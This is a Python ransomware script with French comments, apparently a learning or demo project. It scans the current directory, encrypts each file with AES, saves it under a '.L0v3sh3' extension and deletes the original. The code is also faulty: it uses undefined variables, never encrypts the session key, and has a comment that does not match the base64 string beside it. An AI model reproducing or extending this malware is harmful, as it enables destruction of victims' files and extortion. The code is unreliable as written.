import base64
import os
from pathlib import Path
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES

# Ce code nous permet d'avoir la cle publique
with open('public.pem', 'rb') as f:
    pubKey = f.read()
print(base64.b64encode(pubKey))

#pubKey= 'LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUF4VG0xZG1wcXpQQVFqVklBU1BjUQoyS0NaZmJXNEdtWit1RmhzZmg5eG56ZTV3M2dVVHYzMFREeFZwcUZpbWZZb2lLQnN0TC9UYjl2RmM2YjNyRU5HCks3dzMzYkdLcCtRWnJ5OVpBOW1nRm44dklFcFZ2RnEwTEtSM24rbXllSUVrWlBRVDIrdENJWmQxTDNsMDBCdTEKUkhaSkJLU212QXFYYmlyYnZ2V3YxdlNMeEthRDdwemZObU9pcmowMFd4OUdmay9SMk5Sck52MVlsY0hjSXJaMAo0WC9RaXpSdDZwejR3SUxHZ2g0Rk44akNLUzZva2gxa1NyS3RJUTlKd215eDFKS2tsa2FROTZqQUJmenFUT2hQCk1iclhnd25kYkhuUmtCcVZJSUZrbmZuRUtsRDVGbSttc0x0SEpSVVJTK2VRdTM2QzZJUGx2QnJxS1ZPN0pHR1UKeHdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t'
##Lorsque ce code est exécuté, il imprimera "b'hi friends, this is base64 encoding'" qui est la version décodée de la chaîne de caractères encodée en base64.
#pubKey=base64.b64decode(pubKey)

files=[]

def scanRecurse(): ##On peut étendre le ransomware à d'autres fichiers en utilisant un argument baseDir dans la fonction
    for entry in os.scandir():
        if entry.name== "malware.py" or entry.name== "generatekey.py":
            continue
        if entry.is_file():
            files.append(entry)
    return files

def encrypt(dataFile, publicKey):

    with open(dataFile, "r") as f:
        data=f.read()

        #Conversion en bytes car les opérations de chiffrement agissent sur les bits
        #En cas de non conversion, on pourrait avoir des erreurs dee chiffrement
    data=bytes(data)

    # Créer un objet clé public
    key= RSA.import_key(publicKey)
    # générer une clé de session qui sera utilisée pour chiffrer les données.
    sessionKey=os.urandom(16)

    # Crypter la session avec la clé de session
    cipher = AES.new(sessionKey, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)

    # Sauvegarder les données encryptees dans un fichier
    fileName= dataFile.split(extension)[0]
    fileExtension = '.L0v3sh3'
    encryptedFile = fileName + fileExtension
    with open(encryptedFile, 'wb') as f:
        [ f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext) ]
    os.remove(dataFile)

# change directory to the directory of the script
# keep secure of changing the directory,
# DONT RUN THIS SCRIPT ON YOUR PC
excludeExtension = ['.py','.pem', '.exe'] # CHANGE THIS
for item in scanRecurse(): 
    filePath = Path(item)
    fileType = filePath.suffix.lower()

    if fileType in excludeExtension:
        continue
    encrypt(filePath, pubKey)